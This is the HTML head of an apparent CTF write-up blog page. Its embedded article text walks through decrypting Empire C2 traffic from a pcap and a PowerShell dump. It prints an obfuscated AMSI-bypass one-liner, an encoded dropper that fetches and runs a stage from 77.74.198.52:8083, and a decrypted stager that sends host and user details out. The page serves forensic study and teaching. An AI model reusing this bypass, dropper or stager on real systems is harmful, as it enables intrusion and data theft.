<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Empire is at Risk - Writeup | Journal of Connar</title>
<meta name="keywords" content="">
<meta name="description" content="Intro
In this challenge we are given:

    A pcap file (capture.pcap)
    A powershell dump (powershell.DMP)

A lot of times hard difficulty challenges are related to C2 traffic, and in this challenge we are given a pcap file that indicates there is a chance this might be the case. Simply searching for Empire C2 (Empire from the title of the challenge) will yield results related to an Empire C2 Framework.
Reference material to solve the challenge
Navigating through some posts, a very good one that I used as a reference while solving the challenge was:">
<meta name="author" content="connar">
<link rel="canonical" href="https://connar.github.io/ctfwriteups/empirec2/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6da9a63d25a9608bca2f7f907a030e887a7dd3c3f3918e4cc113129361414bda.css" integrity="sha256-bammPSWpYIvKL3&#43;QegMOiHp908PzkY5MwRMSk2FBS9o=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://connar.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://connar.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://connar.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://connar.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://connar.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://connar.github.io/ctfwriteups/empirec2/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
<meta property="og:url" content="https://connar.github.io/ctfwriteups/empirec2/">
  <meta property="og:site_name" content="Journal of Connar">
  <meta property="og:title" content="Empire is at Risk - Writeup">
  <meta property="og:description" content="Intro In this challenge we are given:
A pcap file (capture.pcap)
A powershell dump (powershell.DMP)
A lot of times hard difficulty challenges are related to C2 traffic, and in this challenge we are given a pcap file that indicates there is a chance this might be the case. Simply searching for Empire C2 (Empire from the title of the challenge) will yield results related to an Empire C2 Framework.
Reference material to solve the challenge Navigating through some posts, a very good one that I used as a reference while solving the challenge was:">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="ctfwriteups">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Empire is at Risk - Writeup">
<meta name="twitter:description" content="Intro
In this challenge we are given:

    A pcap file (capture.pcap)
    A powershell dump (powershell.DMP)

A lot of times hard difficulty challenges are related to C2 traffic, and in this challenge we are given a pcap file that indicates there is a chance this might be the case. Simply searching for Empire C2 (Empire from the title of the challenge) will yield results related to an Empire C2 Framework.
Reference material to solve the challenge
Navigating through some posts, a very good one that I used as a reference while solving the challenge was:">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Ctfwriteups",
      "item": "https://connar.github.io/ctfwriteups/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Empire is at Risk - Writeup",
      "item": "https://connar.github.io/ctfwriteups/empirec2/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Empire is at Risk - Writeup",
  "name": "Empire is at Risk - Writeup",
  "description": "Intro In this challenge we are given:\nA pcap file (capture.pcap)\nA powershell dump (powershell.DMP)\nA lot of times hard difficulty challenges are related to C2 traffic, and in this challenge we are given a pcap file that indicates there is a chance this might be the case. Simply searching for Empire C2 (Empire from the title of the challenge) will yield results related to an Empire C2 Framework.\nReference material to solve the challenge Navigating through some posts, a very good one that I used as a reference while solving the challenge was:\n",
  "keywords": [
    
  ],
  "articleBody": "Intro In this challenge we are given:\nA pcap file (capture.pcap)\nA powershell dump (powershell.DMP)\nA lot of times hard difficulty challenges are related to C2 traffic, and in this challenge we are given a pcap file that indicates there is a chance this might be the case. Simply searching for Empire C2 (Empire from the title of the challenge) will yield results related to an Empire C2 Framework.\nReference material to solve the challenge Navigating through some posts, a very good one that I used as a reference while solving the challenge was:\nhttps://www.keysight.com/blogs/en/tech/nwvs/2021/06/16/empire-c2-networking-into-the-dark-side This post showcases how to decrypt traffic step by step and the similarities between this post and the challenge are plenty, which helped me a ton in the proccess of following it step by step. Quoted from the post:\nSTAGE 0 - First, the victim sends a GET beacon with a cookie in the HTTP headers, server replies with 200 OK with a big (~ 5.5 KB) encrypted payload.\rSTAGE 1 - The victim sends a POST message with an encrypted payload, to which server sends a 200 OK response with a small payload.\rSTAGE 2 - Finally, the victim sends another POST message, to which server replies with an even bigger (~ 41KB) payload. I will show how to proceed to each step and gather all the required info to decrypt the traffic.\nGetting the RC4 key Before we head to STAGE 0, we need to find the dropper. Navigating through the first TCP streams, we will end up finding the following packet:\nPS C:\\Windows\\system32\u003e whoami\rcorp\\satadministrator\rPS C:\\Windows\\system32\u003e $MFmONzmHg=$null;$rfsbs=\"$(('S'+'y'+'s'+'t'+'e'+'m').nORMALIZe([ChAR](70*52/52)+[CHAr](66+45)+[cHar]([byTe]0x72)+[chAr]([byte]0x6d)+[chAr](68*21/21)) -replace [CHaR](92*74/74)+[ChaR](112)+[chAR](123)+[cHaR](25+52)+[ChaR]([bYtE]0x6e)+[CHaR](18+107)).$([CHaR]([bYte]0x4d)+[chAr]([ByTe]0x61)+[cHAR]([ByTe]0x6e)+[cHaR](97)+[ChAr](103*89/89)+[CHar]([bytE]0x65)+[ChaR](17+92)+[cHaR]([BytE]0x65)+[char](51+59)+[cHaR](116+63-63)).$(('..ut..m'+'..t....n').noRMAlIZE([cHar](17+53)+[chAr](111+5-5)+[ChaR](114+20-20)+[ChAR](109)+[CHar]([BYTe]0x44)) -replace [chaR]([bYtE]0x5c)+[cHAr](28+84)+[CHAr](123*58/58)+[CHar](77)+[char](55+55)+[ChAr](125+34-34)).$([ChAR](30+35)+[char](109+82-82)+[chaR]([ByTE]0x73)+[ChAr]([BYte]0x69)+[char]([BYTE]0x55)+[cHar](116+28-28)+[cHar](105)+[chaR](108)+[Char]([Byte]0x73))\";$hn=\"+[cHAr]([ByTE]0x6d)+[cHaR]([BYtE]0x73)\";[Threading.Thread]::Sleep(1801);[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType($([chAr]([BYTE]0x53)+[chAR](121*1/1)+[CHAr]([byte]0x73)+[char]([bYtE]0x74)+[cHaR]([BytE]0x65)+[ChaR](109+98-98)+[cHAR](46*36/36)+[CHAR](82)+[cHar](61+40)+[ChAr](102*7/7)+[cHAR](108+8-8)+[CHaR]([bYte]0x65)+[char]([ByTE]0x63)+[cHAR]([ByTE]0x74)+[ChAr](105)+[cHAR]([byTe]0x6f)+[chAr]([bytE]0x6e)+[CHaR](46*5/5)+[cHar]([bYte]0x42)+[CHar](105+78-78)+[ChAr]([BytE]0x6e)+[chAR]([BYTe]0x64)+[CHAR](31+74)+[cHaR](22+88)+[chAr]([BytE]0x67)+[cHAR]([BYtE]0x46)+[cHaR](108*18/18)+[ChAR]([byte]0x61)+[cHar]([BYTe]0x67)+[ChAR]([BytE]0x73)))).FullName), $(('S'+'y'+'s'+'t'+'e'+'m').nORMALIZe([ChAR](70*52/52)+[CHAr](66+45)+[cHar]([byTe]0x72)+[chAr]([byte]0x6d)+[chAr](68*21/21)) -replace [CHaR](92*74/74)+[ChaR](112)+[chAR](123)+[cHaR](25+52)+[ChaR]([bYtE]0x6e)+[CHaR](18+107)).Reflection.FieldInfo]\" -as [String].Assembly.GetType($([CHAR]([BYtE]0x53)+[ChAr]([BYTE]0x79)+[cHAR]([BYte]0x73)+[ChAr]([BYTE]0x74)+[CHaR](101+5-5)+[ChaR]([BYTe]0x6d)+[ChAR](46)+[Char]([bYTe]0x54)+[Char]([byTe]0x79)+[chAR](12+100)+[char](101+27-27)))), [Object]([Ref].Assembly.GetType($rfsbs)),($(('GetF..'+'eld').NOrMaLize([chaR](70)+[char]([byTe]0x6f)+[CHAR]([bYtE]0x72)+[CHAr](109)+[CHar]([BYtE]0x44)) -replace [CHAr](92+15-15)+[ChAR]([bYTe]0x70)+[CHAR](123*12/12)+[chAr]([bYTE]0x4d)+[cHar]([bYTE]0x6e)+[ChaR](125+14-14)))).Invoke($([ChAr]([ByTE]0x61)+[CHAr]([BYTe]0x6d)+[chAr](101+14)+[ChaR]([bytE]0x69)+[CHaR]([BYte]0x49)+[char](110+17-17)+[CHaR](105)+[CHAR]([bytE]0x74)+[chAr]([byte]0x46)+[chaR]([byTE]0x61)+[Char]([BytE]0x69)+[chAr](108)+[chAr]([BYTe]0x65)+[chAr]([BYtE]0x64)),((\"NonPublic,Static\") -as [String].Assembly.GetType($([chAr]([BYTE]0x53)+[chAR](121*1/1)+[CHAr]([byte]0x73)+[char]([bYtE]0x74)+[cHaR]([BytE]0x65)+[ChaR](109+98-98)+[cHAR](46*36/36)+[CHAR](82)+[cHar](61+40)+[ChAr](102*7/7)+[cHAR](108+8-8)+[CHaR]([bYte]0x65)+[char]([ByTE]0x63)+[cHAR]([ByTE]0x74)+[ChAr](105)+[cHAR]([byTe]0x6f)+[chAr]([bytE]0x6e)+[CHaR](46*5/5)+[cHar]([bYte]0x42)+[CHar](105+78-78)+[ChAr]([BytE]0x6e)+[chAR]([BYTe]0x64)+[CHAR](31+74)+[cHaR](22+88)+[chAr]([BytE]0x67)+[cHAR]([BYtE]0x46)+[cHaR](108*18/18)+[ChAR]([byte]0x61)+[cHar]([BYTe]0x67)+[ChAR]([BytE]0x73))))).SetValue($MFmONzmHg,$True);\rPS C:\\Windows\\system32\u003e powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQAzAEEARABjAEEATABnAEEAMwBBAEQAUQBBAEwAZwBBAHgAQQBEAGsAQQBPAEEAQQB1AEEARABVAEEATQBnAEEANgBBAEQAZwBBAE0AQQBBADQAQQBEAE0AQQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnAGUAdwB0AFYAWgBpAE4AfgA1ACkAMQAzAEMAeAAuAE0AQABvAE8ASgB5AHAAXgBHAD4AVABSAFcAcQAoACMAYgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAUgBZAGIAZgBIAEEAPQBQAG0ATABzAG0AYwBSAGUAKwBRAC8AZwB6AEwAUQBiAEoAbQBOAG8ANgBxAEIARgBlAFgAZwA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA Decoding the second b64 data that are going to be executed as powershell code, we get our dropper:\nIf ($PSVersionTable.PSVersion.Major - ge 3) {}; [System.Net.ServicePointManager]::Expect100Continue = 0; $wc = New - Object System.Net.WebClient; $u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'; $ser = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADMA'))); $t = '/news.php'; $wc.Headers.Add('User-Agent', $u); $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy; $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $Script:Proxy = $wc.Proxy; $K = [System.Text.Encoding]::ASCII.GetBytes('ewtVZiN~5)13Cx.M@oOJyp^G\u003eTRWq(#b'); $R = { $D, $K = $Args; $S = 0..255; 0..255|% { $J = ($J + $S[$_] + $K[$_%$K.Count])%256; $S[$_], $S[$J] = $S[$J], $S[$_] }; $D|% { $I = ($I + 1)%256; $H = ($H + $S[$I])%256; $S[$I], $S[$H] = $S[$H], $S[$I]; $_ - bxor$S[($S[$I] + $S[$H])%256] } }; $wc.Headers.Add(\"Cookie\", \"RYbfHA=PmLsmcRe+Q/gzLQbJmNo6qBFeXg=\"); $data = $wc.DownloadData($ser + $t); $iv = $data[0..3]; $data = $data[4..$data.length]; - join[Char[]](\u0026 $R $data ($IV + $K))|IEX This basically downloads the STAGE 0 from the ip:port hidden inside this base64 blob: aAB0AHQAcAA6AC8ALwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADMA.\nThe RC4 key it uses is: ewtVZiN~5)13Cx.M@oOJyp^G\u003eTRWq(#b. It also sets a cookie encrypted with the same RC4 key: PmLsmcRe+Q/gzLQbJmNo6qBFeXg=. Before we proceed to decrypt our STAGE 0 payload, let’s try to decrypt the cookie as the blog suggests (to make sure we have the correct key and way of decryption). Based on the blog, I made the following python script:\nfrom Crypto.Cipher import ARC4 from base64 import b64decode key = b'ewtVZiN~5)13Cx.M@oOJyp^G\u003eTRWq(#b' enc_data = b'PmLsmcRe+Q/gzLQbJmNo6qBFeXg=' encr_data = b64decode(enc_data) cipher = ARC4.new(encr_data[0:4] + key) msg = cipher.decrypt(encr_data[4:19]) print(msg) Running it, we get:\n└─$ python rc4_decrypt.py b'00000000\\x01\\x01\\x00\\x00\\x00\\x00\\x00' which is the same as what the blog showcases, so we are in the right track! Basically, based on the blog:\n+-----------+--------+--------+---------+---------+\r| SessionID | Lang | Meta | Extra | Length |\r+-----------|--------|--------|---------|---------|\r| 8 bytes | 1 byte | 1 byte | 2 bytes | 4 bytes |\r+-----------|--------|--------|---------|-------- |\r| 00000000 | 01 | 01 | 0000 | 0000 |\r+-----------|--------|--------|---------|---------| Stage 0 Great, now let’s head to the response of the GET /news.php which contains the encrypted STAGE 0 code.\nGET /news.php HTTP/1.1\rCookie: RYbfHA=PmLsmcRe+Q/gzLQbJmNo6qBFeXg=\rUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\rHost: 77.74.198.52:8083\rConnection: Keep-Alive\rHTTP/1.1 200 OK\rServer: Werkzeug/2.1.2 Python/3.9.13\rDate: Tue, 30 Aug 2022 16:35:50 GMT\rContent-Type: text/html; charset=utf-8\rContent-Length: 7409\rCache-Control: no-cache, no-store, must-revalidate\rPragma: no-cache\rExpires: 0\rServer: Microsoft-IIS/7.5\rConnection: close\r.).J\u003c...%o...o(]......J.......[\ry.O.^..6...........y.m...A...P.^J...bp:.\r... ...\r%...........f.7......=.O...H0;..0A.B.w.......N.r..[]l..b-.].W...........Y\u003e2Z......\r2..V....!.....CN\u0026ZF.e......[L\").\u0026.....m.....=.:....R.OKJx..=Y.....-.\rY...2.6cA.=....A...IC`.LUo..3.I\\........`......U.......p\r---more data--- We will modify our script to the following one for decryption:\nfrom Crypto.Cipher import ARC4 from base64 import b64decode key = b'ewtVZiN~5)13Cx.M@oOJyp^G\u003eTRWq(#b' # If we choose \"Show data as Raw\" in Wireshark, we will get the following hex data stored in enc_data enc_data = \"1a29d64a3cb4ebaf...[more hex]\" encr_data = bytes.fromhex(enc_data) cipher = ARC4.new(encr_data[0:4] + key) msg = cipher.decrypt(encr_data[4:]) print(msg) After running it, we get the decrypted STAGE 0 powershell code:\n$server = \"http://77.74.198.52:8083\"; $Script:ControlServers = @($server); $Script:ServerIndex = 0; if ($server.StartsWith(\\'https\\')) { [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; } $Script:SendMessage = { param($Packets)if ($Packets) { $EncBytes = Encrypt - Bytes $Packets; $RoutingPacket = New - RoutingPacket - EncData $EncBytes - Meta 5; if ($Script:ControlServers[$Script:ServerIndex].StartsWith(\\'http\\')) { $wc = New - Object System.Net.WebClient; $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy(); $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials; if ($Script:Proxy) { $wc.Proxy = $Script:Proxy; } $wc.Headers.Add(\\'User - Agent\\', $Script:UserAgent); $Script:Headers.GetEnumerator() | ForEach - Object { $wc.Headers.Add($_.Name, $_.Value) }; try { $taskURI = $Script:TaskURIs | Get - Random; $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, \\'POST\\', $RoutingPacket); } catch [System.Net.WebException] { if ($_.Exception.GetBaseException().Response.statuscode - eq 401) { Start - Negotiate - S \"$ser\" - SK $SK - UA $ua; } } } } }; $Script:GetTask = { try { if ($Script:ControlServers[$Script:ServerIndex].StartsWith(\"http\")) { $RoutingPacket = New - RoutingPacket - EncData $Null - Meta 4; $RoutingCookie = [Convert]::ToBase64String($RoutingPacket); $wc = New - Object System.Net.WebClient; $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy(); $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials; if ($Script:Proxy) { $wc.Proxy = $Script:Proxy; } $wc.Headers.Add(\"User-Agent\", $script:UserAgent); $script:Headers.GetEnumerator() | % { $wc.Headers.Add($_.Name, $_.Value) }; $wc.Headers.Add(\"Cookie\", \"session=$RoutingCookie\"); $taskURI = $script:TaskURIs | Get - Random; $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI); $result; } } catch [Net.WebException] { $script:MissedCheckins += 1; if ($_.Exception.GetBaseException().Response.statuscode - eq 401) { Start - Negotiate - S \"$ser\" - SK $SK - UA $ua; } } }; function Start - Negotiate { param($s, $SK, $UA = \\'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\\', $hop)function ConvertTo - RC4ByteStream { Param ($RCK, $In)begin { [Byte[]] $Str = 0..255; $J = 0; 0..255 | ForEach - Object { $J = ($J + $Str[$_] + $RCK[$_ % $RCK.Length]) % 256; $Str[$_], $Str[$J] = $Str[$J], $Str[$_]; }; $I = $J = 0; } process { ForEach($Byte in $In) { $I = ($I + 1) % 256; $J = ($J + $Str[$I]) % 256; $Str[$I], $Str[$J] = $Str[$J], $Str[$I]; $Byte - bxor $Str[($Str[$I] + $Str[$J]) % 256]; } } } function Decrypt - Bytes { param ($Key, $In)if ($In.Length - gt 32) { $HMAC = New - Object System.Security.Cryptography.HMACSHA256; $e = [System.Text.Encoding]::ASCII; $Mac = $In[ - 10.. - 1]; $In = $In[0..($In.length - 11)]; $hmac.Key = $e.GetBytes($Key); $Expected = $hmac.ComputeHash($In)[0..9]; if (@(Compare - Object $Mac $Expected - Sync 0).Length - ne 0) { return; } $IV = $In[0..15]; try { $AES = New - Object System.Security.Cryptography.AesCryptoServiceProvider; } catch { $AES = New - Object System.Security.Cryptography.RijndaelManaged; } $AES.Mode = \"CBC\"; $AES.Key = $e.GetBytes($Key); $AES.IV = $IV; ($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length - 16) } } $Null = [Reflection.Assembly]::LoadWithPartialName(\"System.Security\"); $Null = [Reflection.Assembly]::LoadWithPartialName(\"System.Core\"); $ErrorActionPreference = \"SilentlyContinue\"; $e = [System.Text.Encoding]::UTF8; $customHeaders = \"\"; $SKB = $e.GetBytes($SK); try { $AES = New - Object System.Security.Cryptography.AesCryptoServiceProvider; } catch { $AES = New - Object System.Security.Cryptography.RijndaelManaged; } $IV = [byte] 0..255 | Get - Random - count 16; $AES.Mode = \"CBC\"; $AES.Key = $SKB; $AES.IV = $IV; $hmac = New - Object System.Security.Cryptography.HMACSHA256; $hmac.Key = $SKB; $csp = New - Object System.Security.Cryptography.CspParameters; $csp.Flags = $csp.Flags - bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore; $rs = New - Object System.Security.Cryptography.RSACryptoServiceProvider - ArgumentList 2048, $csp; $rk = $rs.ToXmlString($False); $ID = - join(\"ABCDEFGHKLMNPRSTUVWXYZ123456789\".ToCharArray()|Get - Random - Count 8); $ib = $e.getbytes($rk); $eb = $IV + $AES.CreateEncryptor().TransformFinalBlock($ib, 0, $ib.Length); $eb = $eb + $hmac.ComputeHash($eb)[0..9]; if ( - not $wc) { $wc = New - Object System.Net.WebClient; $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy(); $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials; } if ($Script:Proxy) { $wc.Proxy = $Script:Proxy; } if ($customHeaders - ne \"\") { $headers = $customHeaders - split \\', \\'; $headers | ForEach - Object { $headerKey = $_.split(\\':\\')[0]; $headerValue = $_.split(\\':\\')[1]; if ($headerKey - eq \"host\") { try { $ig = $WC.DownloadData($s) } catch {} }; $wc.Headers.Add($headerKey, $headerValue); } } $wc.Headers.Add(\"User-Agent\", $UA); $IV = [BitConverter]::GetBytes($(Get - Random)); $data = $e.getbytes($ID) + @(0x01, 0x02, 0x00, 0x00) + [BitConverter]::GetBytes($eb.Length); $rc4p = ConvertTo - RC4ByteStream - RCK $($IV + $SKB) - In $data; $rc4p = $IV + $rc4p + $eb; $raw = $wc.UploadData($s + \"/login/process.php\", \"POST\", $rc4p); $de = $e.GetString($rs.decrypt($raw, $false)); $nonce = $de[0..15] - join \\'\\'; $key = $de[16..$de.length] - join \\'\\'; $nonce = [String]([long]$nonce + 1); try { $AES = New - Object System.Security.Cryptography.AesCryptoServiceProvider; } catch { $AES = New - Object System.Security.Cryptography.RijndaelManaged; } $IV = [byte] 0..255 | Get - Random - Count 16; $AES.Mode = \"CBC\"; $AES.Key = $e.GetBytes($key); $AES.IV = $IV; $i = $nonce + \\'|\\' + $s + \\'|\\' + [Environment]::UserDomainName + \\'|\\' + [Environment]::UserName + \\'|\\' + [Environment]::MachineName; try { $p = (gwmi Win32_NetworkAdapterConfiguration|Where { $_.IPAddress } |Select - Expand IPAddress); } catch { $p = \"[FAILED]\" } $ip = @ { $true = $p[0]; $false = $p } [$p.Length - lt 6]; if (!$ip - or $ip.trim() - eq \\'\\') { $ip = \\'0.0.0.0\\' }; $i += \"|$ip\"; try { $i += \\'|\\' + (Get - WmiObject Win32_OperatingSystem).Name.split(\\'|\\')[0]; } catch { $i += \\'|\\' + \\'[FAILED]\\' } if (([Environment]::UserName).ToLower() - eq \"system\") { $i += \"|True\" } else { $i += \\'|\\' + ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] \"Administrator\") } $n = [System.Diagnostics.Process]::GetCurrentProcess(); $i += \\'|\\' + $n.ProcessName + \\'|\\' + $n.Id; $i += \"|powershell|\" + $PSVersionTable.PSVersion.Major; $i += \"|\" + $env:PROCESSOR_ARCHITECTURE; $ib2 = $e.getbytes($i); $eb2 = $IV + $AES.CreateEncryptor().TransformFinalBlock($ib2, 0, $ib2.Length); $hmac.Key = $e.GetBytes($key); $eb2 = $eb2 + $hmac.ComputeHash($eb2)[0..9]; $IV2 = [BitConverter]::GetBytes($(Get - Random)); $data2 = $e.getbytes($ID) + @(0x01, 0x03, 0x00, 0x00) + [BitConverter]::GetBytes($eb2.Length); $rc4p2 = ConvertTo - RC4ByteStream - RCK $($IV2 + $SKB) - In $data2; $rc4p2 = $IV2 + $rc4p2 + $eb2; if ($customHeaders - ne \"\") { $headers = $customHeaders - split \\', \\'; $headers | ForEach - Object { $headerKey = $_.split(\\':\\')[0]; $headerValue = $_.split(\\':\\')[1]; if ($headerKey - eq \"host\") { try { $ig = $WC.DownloadData($s) } catch {} }; $wc.Headers.Add($headerKey, $headerValue); } } $wc.Headers.Add(\"User-Agent\", $UA); $wc.Headers.Add(\"Hop-Name\", $hop); $raw = $wc.UploadData($s + \"/admin/get.php\", \"POST\", $rc4p2); IEX $( $e.GetString($(Decrypt - Bytes - Key $key - In $raw)) ); $AES = $null; $s2 = $null; $wc = $null; $eb2 = $null; $raw = $null; $IV = $null; $wc = $null; $i = $null; $ib2 = $null; [GC]::Collect(); LRFT7 - Servers @(($s - split \"/\")[0..2] - join \"/\") - StagingKey $SK - SessionKey $key - SessionID $ID - WorkingHours \"\" - KillDate \"\" - ProxySettings $Script:Proxy; } Start - Negotiate - s \"$ser\" - SK \\'ewtVZiN~5)13Cx.M@oOJyp^G \u003e TRWq(#b\\' - UA $u - hop \"$hop\"; Stage 1 Continuing with the next pair of HTTP request-response, we are met with the following packet:\nPOST /login/process.php HTTP/1.1\rCookie: RYbfHA=PmLsmcRe+Q/gzLQbJmNo6qBFeXg=\rUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\rHost: 77.74.198.52:8083\rContent-Length: 462\r......",
  "wordCount" : "3105",
  "inLanguage": "en",
  "datePublished": "0001-01-01T00:00:00Z",
  "dateModified": "0001-01-01T00:00:00Z",
  "author":[{
    "@type": "Person",
    "name": "connar"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://connar.github.io/ctfwriteups/empirec2/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Journal of Connar",
    "logo": {
      "@type": "ImageObject",
      "url": "https://connar.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
